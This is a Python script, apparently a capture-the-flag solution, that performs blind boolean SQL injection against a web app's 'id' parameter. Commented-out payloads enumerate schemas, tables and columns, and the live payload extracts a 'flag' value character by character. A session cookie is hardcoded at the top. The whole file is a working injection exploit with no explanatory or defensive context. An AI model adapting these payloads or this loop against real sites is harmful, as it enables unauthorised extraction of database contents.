import requests
from tqdm import tqdm,trange

Cookie = "_ga=GA1.1.1408222342.1673529912; _ga_P1E9Z5LRRK=GS1.1.1673529911.1.1.1673532345.0.0.0; SESSION=MTY3MzYxNTU0MHxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18P_yqZDocOMUpkqEPNWq0e4stb2dN8lo_4JQRl_zoj-E="
flag = ""

for i in trange(100):
    for j in range(32,128):
        # payload = "0||if((substr((SELECT(GROUP_CONCAT(schema_name))FROM(INFORMATION_SCHEMA.SCHEMATA)),{},1))/*1*/like/*1*/'{}',1,0)".format(j, chr(i))
        # url = "http://172.31.3.147:8000/index.php?id=0||if(ascii(SUBSTR(show tables,%d,1))=%d,1,0)" % (i, j)
        # url = "http://172.31.3.147:8000/index.php?id=0||if(ascii(SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema = \"eight\"),%d,1))=%d,1,0)" % (i, j)
        # url = "http://172.31.3.147:8000/index.php?id=0||if(ascii(SUBSTR((select group_concat(column_name) from information_schema.columns where table_name = \"flag\"),%d,1))=%d,1,0)" % (i, j)
        url = "http://172.31.3.147:8000/index.php?id=0||if(ascii(SUBSTR((select(flag)from(flag)),%d,1))=%d,1,0)" % (i, j)
        result = requests.get(url=url).text
        # print(url)
        # print(result)
        print(flag)
        if "臭豆腐" in result:
            flag += chr(j)
            break
        if "蛋糕" in result:
            # print("error")
            pass

